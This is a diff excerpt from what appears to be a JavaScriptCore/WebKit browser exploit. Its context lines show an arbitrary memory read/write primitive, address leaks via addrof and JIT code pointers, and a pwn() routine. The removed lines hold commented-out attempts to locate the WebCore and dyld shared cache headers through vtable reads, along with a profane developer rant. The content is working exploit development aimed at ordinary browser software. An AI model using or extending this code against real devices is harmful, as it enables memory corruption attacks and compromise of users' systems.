@@ -659,23 +659,7 @@ var VM_PROT_EXECUTE = 0x4
      
     print("[+] arbitrary memory read/write working");
         var log = print;
-        //never tried this method...
-        //const audioCtx = new AudioContext();
-
-        /*var d = new AudioWorkletProcessor();
-        log('[*] Creating the HTMLDivElement wrapper...');
-        //var d = oscillator;
-        let ad_div = addrof(d);
-        log('[+] Address of the div is '+ad_div.toString(16));
-        //alert(FPO)
-        let exe_ptr = memory.read_i64(Add(ad_div, FPO));
-        log('[+] Executable instance is at '+exe_ptr.toString(16));
-        let v_tlb = memory.read_i64(exe_ptr);
-        log('[+] Oscillator vtable seems to be at '+v_tlb.toString(16));
-        var anchor = memory.read_i64(v_tlb)
-        var hdr = Sub(anchor, anchor.lo() & 0xfff);
-        log('Webcore header @' + hdr); //dyld_cache_header
-        */ //this wont be viable in our context as we can't access DOM Objects from a webworker dialect RIP.
+        
         function makeJITCompiledFunction() {
     var obj = {};
     // Some code to avoid inlining...
@@ -771,28 +755,6 @@ var VM_PROT_EXECUTE = 0x4
     var anchor = memory.read64(jitCodeAddr);
     print("JavaScriptCore instance @" + anchor);
           }
-          
-
-          /*function arbrw(rw) {
-              var print = (msg) => {
-                  port.postMessage(msg)
-              };
-              
-              
-
-        while(true)
-        {
-        FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
-        if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
-        //webcore header magic...
-        {
-            alert1(String.fromCharCode(...memory.read(hdr, 0x10)))
-            break;
-        }
-        hdr = Sub(hdr, new Int64(0x1000));
-        }
-        log("dyld shared cache header @" + hdr);
-        }*/
           function pwn() {
             try {
               var set = setupPrimitives();
